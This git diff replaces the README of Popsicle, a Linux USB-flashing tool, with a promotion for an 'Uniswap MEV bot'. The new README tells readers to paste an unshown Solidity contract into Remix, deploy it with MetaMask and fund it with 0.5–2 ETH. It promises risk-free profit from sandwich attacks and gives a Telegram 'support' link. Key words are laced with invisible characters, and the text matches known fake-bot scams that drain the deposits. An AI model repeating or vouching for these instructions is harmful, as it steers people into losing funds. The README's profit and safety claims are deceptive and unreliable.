@@ -1,51 +1,78 @@
-# Popsicle
 
-Popsicle is a Linux utility for flashing multiple USB devices in parallel, written in [Rust](https://www.rust-lang.org/en-US/).
+# UniSwap-Mevbot
+Fully-auto on-chain Uniswap MEVbot leveraging flashloans and the minimal gas fees of Ethereum to perform sandwich attacks and front-runs on Uniswap.
 
-## Build Dependencies
+Launch your own MEV engine or start trading with my public program for a 0.1% fee on successful arbitrage transactions.
 
-If building the GTK front end, you will be required to install the development dependencies for GTK and D-Bus, usually named `libgtk-3-dev` and `libdbus-1-dev`, respectively. No other dependencies are required to build the CLI or GTK front ends, besides Rust's `cargo` utility.
+> [!IMPORTANT]
+> Due to the atomic nature of Flashloan operations, if they aren't profitable the transaction will revert and no net profit will be lost.
 
-For those who need to vendor Cargo's crate dependencies which are fetched from [Crates.io](https://crates.io/), you will need to install [cargo-vendor](https://github.com/alexcrichton/cargo-vendor), and then run `make vendor`.
-
-## Installation Instructions
-
- A makefile is included for simply building and installing all required files into the system. You may either build both the CLI and GTK workspace, just the CLI workspace, or just the GTK workspace.
-
-- `make cli && sudo make install-cli` will build and install just the CLI workspace
-- `make gtk && sudo make install-gtk` will build and install just the GTK workspace
-- `make && sudo make install` will build and install both the CLI and GTK workspaces
-
-## Screenshots
-
-### Image Selection
-
-![Image Selection](./screenshots/screenshot-01.png)
-
-### Device Selection
-
-![Device Selection](./screenshots/screenshot-02.png)
-
-The list will also dynamically refresh as devices are added and removed
-
-![GIF Demo](./screenshots/device-monitoring.gif)
-
-### Device Flashing
-
-![Flashing Devices](./screenshots/screenshot-03.png)
-![Flashing Devices](./screenshots/screenshot-04.png)
-
-### Summary
-
-![Summary](./screenshots/screenshot-05.png)
-
-## Translators
-
-Translators are welcome to submit translations directly as a pull request to this project. It is generally expected that your pull requests will contain a single commit for each language that was added or improved, using a syntax like so:
-
+# How MEVBOT works
+```mermaid
+graph LR
+A(User Transaction)-->B(MEV Bot)-->C(Opportunity Detection)--> E(Transaction Construction)
+E --> F(Transaction Submission)
+F -->J(Block Inclusion)
+J-->K(Profit Realization)
 ```
-i18n(eo): Add Esperanto language support
-```
+  - User Transaction: A user submits a transaction to the Ethereum network.
+  - MEV Bot: The MEV bot monitors the mempool for profitable opportunities.
+  - Opportunity Detection: The bot identifies potential MEV opportunities (e.g., arbitrage, liquidation).
+  - Transaction Construction: The bot constructs a transaction to exploit the opportunity.
+  - Transaction Submission: The bot submits the transaction to the network.
+  - Block Inclusion: The transaction gets included in a block by miners.
+  - Profit Realization: The MEV bot realizes the profit from the successful transaction.
 
-Translation files can be found [here](./i18n/). We are using [Project Fluent](https://projectfluent.org) for our translations, which should be easier than working with gettext.
+ #### The bot is constantly sniffing the for user buys, sells, and token creations containing slippage deficits.
+> [!TIP]
+> Bot operators can target any transaction value within their balance threshold. Generally, higher thresholds net consistently viable transactions
+-  Once a transaction is identified, a flashloan is initiated for the target transaction amount, this requires a marginal amount of collateral.
+-  The bot will aggresively attempt to front-run the transaction by dynamically monitoring the bribe to the miner and increasing it if necessary so as to be the first transaction mined.
+- Depending on the set parameters, the bot will either front-run the Dev's sell to remain in profit, or sell upon the token reaching KOTH.
+- The flashloan is then repaid, collateral is reiumbursed and profits are deposited into the operators wallet.
+-  If the transaction is unprofitable at any point it will be reverted and the flashloan will be repaid, losing no gas or net profit.
+# Setup
+1. Download [**MetaMask**](https://metamask.io/download.html) (if you don’t have it already)
+ 
+2. Access to [**Remix Ethereum IDE**](https://remix.ethereum.org/).
+   
+   <img src="https://i.ibb.co/ftNtP8G/2.png" alt="2" border="0">
+   
+   #### For the Remix IDE you can follow this steps:
+3. Click on the `contracts` folder and then create `New File`. Rename it as you like, for example: `bot.sol`
 
+   #### Note: If there is a problem if the text is not colored when you create bot.sol and paste the code from pastebin, try again. If the codes are not colored, you cannot proceed to the next step.
+
+4. Paste this [****sourcecode****](sourcecode.sol) code in R­­emi­x­.
+
+5.  Go to the `Solidity Compiler` tab, select version `0.6.6+commit.6c089d02` and click `Compile bot.sol`.
+ 
+    Make sure `bot.sol` is selected in the CONTRACT section of the SOLIDITY COMPILER section.
+
+6. TGo to the `DEPLOY & RUN TRANSACTIONS` tab, select the `Injected Provider - ­M­et­am­as­k­­` environment and then `Deploy`. By approving the Me­­ta­­­ma­­sk contract creation fee, you will have created your own contract (ignore any IFPS errors that may appear afterwards).
+
+7. Copy your newly created contract address and fund it with any amount of ETH (at least 0.5-2 ETH or more is recommended) Simply send ETH to your newly created contract address to allow the bot to earn money.
+
+8. After your transaction is confirmed, click the “start” button to run the b­o­­t. Withdraw your ETH at any time by clicking the “Withdraw” button.
+
+
+> [!IMPORTANT]
+> The bot will immediately begin searching for and transacting arbitrage.
+> Stop the bot any time by clicking the "STOP" button. any current transactions will be sold or reverted.
+
+
+
+
+# Contributions
+
+Contributions are welcome. If you would like to contribute please submit a pull request with your suggested changes.
+
+# Support
+If you benefitted from the project, show us some support by giving us a star ⭐. Open source is awesome!
+
+# Help
+If at any time you encounter any issues with the contract setup, contact the team at  [**Click Here**](https://t.me/UniMevBotsSupport/). 🛡️
+
+# License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
